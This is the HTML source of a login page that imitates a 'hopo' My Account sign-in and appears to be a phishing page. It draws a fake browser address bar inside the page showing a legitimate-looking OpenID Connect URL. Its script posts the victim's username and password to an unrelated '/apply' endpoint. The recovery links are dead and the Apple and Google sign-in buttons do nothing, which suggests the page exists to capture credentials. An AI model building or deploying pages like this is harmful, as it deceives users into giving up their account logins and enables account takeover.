<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>hopo - My Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif}
body{background:#f5f6f7;min-height:100vh}
.topbar{
  background:#e8edf5;
  height:56px;
  display:flex;
  align-items:center;
  padding:0 24px;
  border-bottom:1px solid #dde3ee;
}
.logo{
  display:flex;
  align-items:center;
  gap:10px;
  font-size:30px;
  font-weight:800;
  color:#25324a;
  margin-left:16%;
}
.logo-icon{
  width:36px;height:36px;
  background:#2d3e8a;
  background:linear-gradient(135deg,#7ab8d6 0%,#4a7fc1 100%);
  border-radius:50% 50% 50% 50% / 60% 60% 40% 40%;
  display:grid;place-items:center;
  color:white;font-weight:900;
  position:relative;
}
.logo-icon::before{
  content:"";
  position:absolute;
  width:18px;height:18px;
  border:3px solid white;
  border-radius:4px;
  opacity:0.9;
}
.center{
  display:flex;
  justify-content:center;
  padding-top:32px;
}
.card{
  width:520px;
  background:#eef3fb;
  padding:28px 32px 20px;
  border-radius:4px;
}
.card h2{font-size:20px;font-weight:500;color:#2c3a52;margin-bottom:20px}
label.title{display:block;font-size:13px;font-weight:700;color:#2c3a52;margin-bottom:6px;margin-top:10px}
.input{
  width:100%;height:42px;
  border:1px solid #a9b8d0;
  border-radius:4px;
  padding:0 14px;
  font-size:14px;
  background:white;
  outline:none;
}
.input:focus{border-color:#2b5cb0;box-shadow:0 0 0 3px rgba(43,92,176,.12)}
.pass-wrap{position:relative}
.pass-wrap .input{padding-right:40px}
.eye{
  position:absolute;right:10px;top:50%;transform:translateY(-50%);
  background:none;border:none;cursor:pointer;
}
.remember{display:flex;align-items:center;gap:6px;margin:14px 0 8px;font-size:13px;color:#3a4a64}
.remember input{width:16px;height:16px}
.info{
  width:14px;height:14px;border:1px solid #8aa0c0;border-radius:50%;
  display:grid;place-items:center;font-size:9px;color:#6a7d9c
}
.links{display:flex;justify-content:center;gap:20px;margin:12px 0 16px}
.links a{font-size:13px;color:#2b5cb0;font-weight:600;text-decoration:none}
.links a:hover{text-decoration:underline}
.btn-sign{
  width:100%;height:40px;
  background:#1e3a8a;border:none;border-radius:20px;
  color:white;font-size:15px;font-weight:600;cursor:pointer;
  margin-top:4px;
}
.btn-sign:hover{background:#162e70}
.btn-sign:disabled{background:#6a7d9c;cursor:not-allowed}
.or{text-align:center;margin:20px 0;color:#6a7d9c;font-size:14px}
.btn-social{
  width:100%;height:44px;border-radius:22px;
  border:none;font-size:14px;font-weight:600;cursor:pointer;
  display:flex;align-items:center;justify-content:center;gap:10px;
  margin-bottom:12px;
}
.btn-apple{background:#1f2937;color:white}
.btn-google{background:#f8fafc;border:1px solid #cbd5e1;color:#475569}
.footer{border-top:1px solid #d6deeb;margin-top:20px;padding-top:16px;text-align:center}
.footer p{font-size:13px;color:#6a7d9c;margin-bottom:4px}
.footer a{font-size:13px;color:#2b5cb0;font-weight:700;text-decoration:none}
.footer a:hover{text-decoration:underline}
.url{
  font-size:11px;color:#6b7a90;background:white;
  border:1px solid #dde3ee;border-radius:16px;
  padding:4px 12px;max-width:500px;overflow:hidden;white-space:nowrap;
  margin-left:20px;
}
.status-msg{text-align:center;font-size:14px;margin-top:12px;display:none;font-weight:600}
.status-success{color:#16a34a}
.status-error{color:#dc2626}
@media(max-width:700px){.logo{margin-left:0}.card{width:94%}.url{display:none}}
</style>
</head>
<body>

<div class="topbar">
  <div class="logo"><div class="logo-icon">h</div> hopo</div>
  <div class="url">id.my.hopo.com/realms/customer/protocol/openid-connect/auth?client_id=hzl_myaccount_api&scope=openid%20e...</div>
</div>

<div class="center">
<div class="card">
  <h2>Log in to My Account</h2>

  <!-- Wrap controls in a proper Form configuration -->
  <form id="loginForm">
    <label class="title">Username</label>
    <input class="input" type="text" name="username" placeholder="Enter your username" required>

    <label class="title">Password</label>
    <div class="pass-wrap">
      <input class="input" type="password" name="password" placeholder="Enter your password" id="pwd" required>
      <button type="button" class="eye" onclick="const p=document.getElementById('pwd'); p.type = p.type==='password'?'text':'password'">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b7a90" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
      </button>
    </div>

    <div class="remember">
      <input type="checkbox" id="rem" name="remember">
      <label for="rem">Remember me</label>
      <span class="info">i</span>
    </div>

    <div class="links">
      <a href="#">Forgot username?</a>
      <a href="#">Forgot password?</a>
    </div>

    <!-- type="submit" initiates the submit event -->
    <button type="submit" class="btn-sign" id="submitBtn">Sign In</button>
  </form>

  <div id="statusMessage" class="status-msg"></div>

  <div class="or">Or sign in with</div>

  <button type="button" class="btn-social btn-apple">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 2c1.1 0 2 .9 2 2 0 1.1-.9 2-2 2s-2-.9-2-2c0-1.1.9-2 2-2zm6.2 5.4c.3 0 .5.2.5.5v.5c0 3.5-2.5 7.4-5.7 8.6-.3.1-.6 0-.8-.2l-1.1-1c-.2-.2-.3-.5-.2-.8.4-1.1.6-2.3.6-3.5 0-1.2-.2-2.4-.6-3.5-.1-.3 0-.6.2-.8l1.1-1c.2-.2.5-.3.8-.2 1.2.5 2.3 1.3 3.2 2.4.3-.2.7-.3 1.1-.3 1.4 0 2.6 1.2 2.6 2.6 0 .4-.1.8-.3 1.1z"/></svg>
    Sign in with Apple
  </button>
  <button type="button" class="btn-social btn-google">
    <img src="https://www.svgrepo.com/show/475656/google-color.svg" width="18" alt="Google"> Sign in with Google
  </button>

  <div class="footer">
    <p>Don't have a My Account profile?</p>
    <a href="#">Create one today</a>
  </div>
</div>
</div>

<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault(); // Prevents standard full-page redirect reload
  
  const submitBtn = document.getElementById('submitBtn');
  const statusMessage = document.getElementById('statusMessage');
  
  // Update UI loading state
  submitBtn.disabled = true;
  submitBtn.innerText = "Signing in...";
  statusMessage.style.display = "none";

  // Use FormData object to automatically pick up inputs with name attributes
  const formData = new FormData(this);

  try {
    const response = await fetch('/apply', {
      method: 'POST',
      body: formData // Sends multi-part data seamlessly matching upload.any()
    });

    const result = await response.json();

    statusMessage.style.display = "block";
    if (response.ok && result.success) {
      statusMessage.className = "status-msg status-success";
      statusMessage.innerText = "Logged in successfully! Redirecting...";
      // Optional: window.location.href = "/dashboard";
    } else {
      statusMessage.className = "status-msg status-error";
      statusMessage.innerText = result.error || "Login failed. Please try again.";
    }
  } catch (error) {
    statusMessage.style.display = "block";
    statusMessage.className = "status-msg status-error";
    statusMessage.innerText = "Network error. Unable to connect to server.";
    console.error("Submission error:", error);
  } finally {
    // Re-enable button
    submitBtn.disabled = false;
    submitBtn.innerText = "Sign In";
  }
});
</script>

</body>
</html>
